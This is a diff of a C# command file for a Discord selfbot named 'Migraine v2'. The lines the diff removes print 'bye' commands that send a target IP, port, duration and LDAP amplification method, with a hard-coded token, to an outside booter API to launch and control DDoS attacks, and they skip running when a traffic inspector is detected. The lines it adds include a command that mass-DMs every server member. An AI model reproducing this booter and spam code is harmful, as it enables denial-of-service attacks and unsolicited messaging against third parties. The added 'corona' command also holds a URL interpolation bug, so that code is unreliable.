@@ -3,7 +3,6 @@ using Discord.Commands;
 using Discord.WebSocket;
 using Figgle;
 using Migraine_v2.API;
-using Migraine_v2.LoginClass;
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 using System;
@@ -22,41 +21,6 @@ namespace Migraine_v2.SelfbotClasses {
     public class Commands : ModuleBase
     {
         //====================work in progress=======================/
-        //[Command("backup")]
-        //public async Task Backup()
-        //{
-        //    await Context.Message.DeleteAsync();
-        //    var channels = Context.Guild.GetChannelsAsync(CacheMode.AllowDownload);
-        //    var catagory = Context.Guild.GetCategoriesAsync(CacheMode.AllowDownload);
-        //    var servericon = Context.Guild.IconUrl;
-        //    var bannedmembers = Context.Guild.GetBansAsync();
-        //    var servername = Context.Guild.Name;
-        //    var roles = Context.Guild.Roles;
-        //    var emojis = Context.Guild.Emotes;
-        //    var serverid = Context.Guild.Id;
-        //    bool misc = !Directory.Exists("MISC");
-        //    if (misc)
-        //        Directory.CreateDirectory("MISC");
-        //    string saver = $"MISC/Backups/{serverid}-" + DateTime.Now.ToString("hh-mm tt" + "/");
-        //    Directory.CreateDirectory(saver);
-        //    string channel = string.Join("\n", channels);
-        //    string catagorys = string.Join("\n", catagory);
-        //    string servername1 = string.Join("\n", servername);
-
-        //    File.AppendAllText(saver + "Saved Channels.txt", contents);
-        //    File.AppendAllText(saver + "Saved Catagorys.txt", contents);
-        //    File.AppendAllText(saver + "Saved Server Name.txt", contents);
-        //    File.AppendAllText(saver + "Saved Servers.txt", contents);
-        //    File.AppendAllText(saver + "Saved Servers.txt", contents);
-
-        //    var embed = new EmbedBuilder();
-        //    embed.WithTitle("Success!");
-        //    embed.WithAuthor(Context.User.Username, Context.User.GetAvatarUrl(ImageFormat.Auto));
-        //    embed.WithDescription($"Successfully saved {getservers.Count.ToString()} servers to text file.");
-        //    embed.WithColor(Globals.EmbedHexColor);
-        //    await Context.Channel.SendMessageAsync("", false, embed.Build());
-        //}
-
         [Command("dchan")]
         public async Task DeleteChannels()
         {
@@ -357,6 +321,15 @@ namespace Migraine_v2.SelfbotClasses {
             embed.WithColor(Globals.EmbedHexColor);
             await Context.Channel.SendMessageAsync("", false, embed.Build());
         }
+        //[Command("savebuyers")]
+        //public async Task SaveBuyers()
+        //{
+        //    ulong buyer = 680623139599810591;
+        //    await Context.Message.DeleteAsync();
+        //    var getbuyers = await Context.Guild.GetUsersAsync();
+        //    var getrole = Context.Guild.GetRole(buyer);
+
+        //}
 
         [Command("ban")]
         public async Task ban(SocketUser userName = null, string reason = null)
@@ -395,6 +368,25 @@ namespace Migraine_v2.SelfbotClasses {
                 embed.WithColor(new Color(242, 169, 0));
                 embed.AddField("Bitcoin Price:", double.Parse(Convert.ToString(json.rate)).ToString("C"));
 
+                await Context.Channel.SendMessageAsync("", false, embed.Build());
+            }
+        }
+        [Command("corona")]
+        public async Task Corona(string country)
+        {
+            await Context.Message.DeleteAsync();
+            var client = new WebClient();
+            {
+                string covid = client.DownloadString("https://corona.lmao.ninja/countries/{country}");
+                dynamic json = JsonConvert.DeserializeObject(covid);
+                var embed = new EmbedBuilder();
+                embed.WithTitle($"Corona Stats - {country}");
+                embed.WithAuthor(Globals.MigraineImageURL);
+                embed.AddField("Cases", double.Parse(Convert.ToString(json.cases)).ToString("C"), true);
+                embed.AddField("Deaths", double.Parse(Convert.ToString(json.deaths)).ToString("C"), true);
+                embed.AddField("Recovered", double.Parse(Convert.ToString(json.recovered)).ToString("C"), true);
+                embed.WithColor(Globals.EmbedHexColor);
+                embed.WithFooter("Migraine");
                 await Context.Channel.SendMessageAsync("", false, embed.Build());
             }
         }
@@ -444,10 +436,9 @@ namespace Migraine_v2.SelfbotClasses {
             await Context.Message.DeleteAsync();
 
             var embed = new EmbedBuilder();
-            Settings.getSettings();
-            string bitcoin = Settings._Bitcoin;
+
             embed.WithAuthor("Bitcoin Address", "https://bitcoin.org/img/icons/opengraph.png", "https://migraine.best/");
-            embed.WithDescription($"``{bitcoin}``");
+            //embed.WithDescription($"``{bitcoin}``");
             embed.WithColor(Globals.EmbedHexColor);
             await Context.Channel.SendMessageAsync("", false, embed.Build());
 
@@ -458,10 +449,8 @@ namespace Migraine_v2.SelfbotClasses {
             await Context.Message.DeleteAsync();
 
             var embed = new EmbedBuilder();
-            Settings.getSettings();
-            string paypal = Settings._PayPal;
             embed.WithAuthor("Paypal Email", "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/PayPal_Logo_Icon_2014.svg/887px-PayPal_Logo_Icon_2014.svg.png", "");
-            embed.WithDescription($"``{paypal}``");
+            //embed.WithDescription($"``{paypal}``");
             embed.WithColor(new Color(59, 123, 191));
             await Context.Channel.SendMessageAsync("", false, embed.Build());
         }
@@ -470,88 +459,19 @@ namespace Migraine_v2.SelfbotClasses {
         [Command("bye")]
         public async Task Bye(string ip, string port, string time)
         {
-            await Context.Message.DeleteAsync();
-            if (CheckFiddler._())
-                return;
-            var req = new HttpClient();
-            {
-                var PostData = new Dictionary<string, string>
-                {
-                    ["token"] = "pDCNT0zYIjpHsR",
-                    ["target"] = ip,
-                    ["port"] = port,
-                    ["duration"] = time.ToString(),
-                    ["method"] = "LDAP",
-                    ["pps"] = "500000"
-                };
-                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/launch"), new FormUrlEncodedContent(PostData));
-                
-            }
-
-            EmbedBuilder embed = new EmbedBuilder();
-            embed.WithAuthor("Attack sent successfully. | Migraine Booter");
-            //embed.AddField("**ID:**", $"{test_id}");
-            embed.AddField("**Target:**", $"{ip}", true);
-            embed.AddField("**Port:**", $"{port}", true);
-            embed.AddField("**Time:**", $"{time}", true);
-            embed.AddField("**Method:**", "LDAP", true);
-            embed.WithColor(Globals.EmbedHexColor);
-            embed.WithFooter("Migraine");
-
-            await Context.Channel.SendMessageAsync("", false, embed.Build());
+            //removed
         }
 
         [Command("bye stop")]
         public async Task byestop(string test_id)
         {
-            await Context.Message.DeleteAsync();
-            if (CheckFiddler._())
-                return;
-            var req = new HttpClient();
-            {
-                var PostData = new Dictionary<string, string>
-                {
-                    ["token"] = "pDCNT0zYIjpHsR",
-                    ["target"] = test_id
-                };
-                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/stop"), new FormUrlEncodedContent(PostData));
-            }
-
-            EmbedBuilder embed = new EmbedBuilder();
-
-            embed.WithAuthor("Attack successfully stopped. | Migraine Booter");
-            embed.AddField("**ID:**", $"{test_id}");
-            embed.WithColor(Globals.EmbedHexColor);
-            embed.WithFooter("Migraine");
-
-            await Context.Channel.SendMessageAsync("", false, embed.Build());
+            //removed
         }
 
         [Command("bye restart")]
         public async Task byerestart(string test_id)
         {
-            await Context.Message.DeleteAsync();
-            if (CheckFiddler._())
-                return;
-            var req = new HttpClient();
-            {
-                var PostData = new Dictionary<string, string>
-                {
-                    ["token"] = "pDCNT0zYIjpHsR",
-                    ["target"] = test_id
-                };
-                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/restart"), new FormUrlEncodedContent(PostData));
-            }
-
-            EmbedBuilder embed = new EmbedBuilder();
-
-            embed.WithAuthor("Attack sucessfully restarted. | Migraine Booter");
-            embed.AddField("**ID:**", $"{test_id}");
-            embed.WithColor(Globals.EmbedHexColor);
-            embed.WithFooter("Migraine");
-
-            await Context.Channel.SendMessageAsync("", false, embed.Build());
-
+            //removed
         }
 
         [Command("cat")]
@@ -903,34 +823,9 @@ namespace Migraine_v2.SelfbotClasses {
         [RequireUserPermission(GuildPermission.KickMembers)]
         public async Task Kick(SocketGuildUser userName = null, string reason = null)
         {
-            SocketGuildUser user = Context.User as SocketGuildUser;
-            bool flag = userName == null;
-            if (!flag)
-            {
-                bool flag2 = userName == user;
-                if (!flag2)
-                {
-                    int targetHighest = userName.Hierarchy;
-                    int senderHighest = user.Hierarchy;
-                    bool flag3 = targetHighest < senderHighest;
-                    if (flag3)
-                    {
-                        try
-                        {
-                            await userName.KickAsync(null, null);
-                            IUserMessage userMessage = await this.ReplyAsync((reason == null) ? ("I Have Kicked " + userName.Username) : ("I Have Kicked " + userName.Username + " Because: " + reason), false, null, null);
-                            ConsoleLog.Log("Kicked User " + userName.Username + " from " + user.Guild.Name);
-                        }
-                        catch
-                        {
-                        }
-                    }
-                    else
-                    {
-                        await this.ReplyAsync("Uhm, Just Kidding...", false, null, null);
-                    }
-                }
-            }
+            await Context.Message.DeleteAsync();
+            await userName.KickAsync(reason);
+            await Context.Channel.SendMessageAsync($"kicked the mango called {userName}");
         }
 
         [Command("lenny")]
@@ -941,49 +836,16 @@ namespace Migraine_v2.SelfbotClasses {
         }
 
         [Command("massdm")]
-        public async Task MassDM(/*[Remainder] */string message)
+        public async Task MassDM([Remainder] string message)
         {
-            await Context.Message.DeleteAsync(null);
-            if (message == null)
+            await Context.Message.DeleteAsync();
+
+            var getmembers = await Context.Guild.GetUsersAsync();
+
+            foreach (var user in getmembers)
             {
-                await this.ReplyAsync("Need message to send", false, null, null);
+                await user.SendMessageAsync(message);
             }
-            else
-            {
-                ConsoleLog.Log("Started Mass Dming");
-                new Thread(delegate ()
-                {
-                     DmSpam(message);
-                }).Start();
-            }
-        }
-        public async Task DmSpam(string message)
-        {
-            IReadOnlyCollection<IGuildUser> readOnlyCollection = await Context.Guild.GetUsersAsync(CacheMode.AllowDownload, null);
-            IReadOnlyCollection<IGuildUser> users = readOnlyCollection;
-            readOnlyCollection = null;
-            foreach (IGuildUser user in users)
-            {
-                int num = 0;
-                try
-                {
-                    IDMChannel idmchannel = await user.GetOrCreateDMChannelAsync(null);
-                    IDMChannel channel = idmchannel;
-                    idmchannel = null;
-                    await channel.SendMessageAsync(message, false, null, null);
-                    await Task.Delay(100);
-                    channel = null;
-                }
-                catch
-                {
-                    num = 1;
-                }
-                if (num == 1)
-                {
-                    await Task.Delay(1000);
-                }
-            }
-            ConsoleLog.Log("Finished Mass Dming");
         }
 
         [Command("migraine")]
@@ -1242,20 +1104,20 @@ namespace Migraine_v2.SelfbotClasses {
             var server = Context.Guild;
             var embed = new EmbedBuilder();
             embed.WithThumbnailUrl(serveravatar);
-            embed.AddField("**Server Name:** ", $" {server.Name}");
-            embed.AddField("**Server ID:**", $" {server.Id}");
-            embed.AddField("**Server Owner:** ", $"{server.OwnerId}");
-            embed.AddField("**Server Created:** ", $" {server.CreatedAt}");
-            embed.AddField("**Server ID:**", $"{server.Id}");
-            embed.AddField("**Verification Level:**", $"{server.VerificationLevel}");
-            embed.AddField("**Emotes:**", $"{server.Emotes.Count.ToString()}");
-            embed.AddField("**Roles:**", $"{server.Roles.Count.ToString()}");
-            embed.AddField("**Channels:**", $" {server.GetChannelsAsync()}");
+            embed.AddField("**Server Name:** ", $" {server.Name}", true);
+            embed.AddField("**Server ID:**", $" {server.Id}", true);
+            embed.AddField("**Server Owner:** ", $"{server.OwnerId}", true);
+            embed.AddField("**Server Created:** ", $" {server.CreatedAt}", true);
+            embed.AddField("**Server ID:**", $"{server.Id}", true);
+            embed.AddField("**Verification Level:**", $"{server.VerificationLevel}", true);
+            embed.AddField("**Emotes:**", $"{server.Emotes.Count.ToString()}", true);
+            embed.AddField("**Roles:**", $"{server.Roles.Count.ToString()}", true);
             embed.WithColor(Globals.EmbedHexColor);
             embed.WithFooter("Migraine");
 
             await Context.Channel.SendMessageAsync("", false, embed.Build());
         }
+
         //[Command("saveemojis")]
         //public async Task SaveEmojis()
         //{
@@ -1275,6 +1137,7 @@ namespace Migraine_v2.SelfbotClasses {
         //    await Context.Channel.SendMessageAsync("", false, embed.Build());
 
         //}
+
         //[Command("savemembers")]
         //public async Task SaveMembers()
         //{
@@ -1413,25 +1276,19 @@ namespace Migraine_v2.SelfbotClasses {
         }
 
         [Command("userinfo")]
-        public async Task UserInformation([Remainder] SocketGuildUser user = null)
+        public async Task UserInformation(SocketGuildUser user = null)
         {
             await Context.Message.DeleteAsync();
             var RolesString = new List<string>();
             var embed = new EmbedBuilder();
-
             if (user == null)
                 user = (Context.Message.Author as SocketGuildUser);
-
-            foreach (SocketRole role in user.Roles)
-                RolesString.Add(role.Mention);
-
             embed.WithAuthor(user);
             embed.WithThumbnailUrl(user.GetAvatarUrl(ImageFormat.Auto, 128));
             embed.AddField("Bot", user.IsBot, true);
             embed.AddField("Status", user.Activity, true);
-            embed.AddField("Created Account", user.CreatedAt.DateTime.ToString(), true);
             embed.AddField("Joined Server", user.JoinedAt.ToString().Split(new char[]
-            {
+            { 
                 '+'
             })[0], true);
             embed.AddField(string.Format("Roles[{0}]", RolesString.Count), string.Join(", ", RolesString), false);
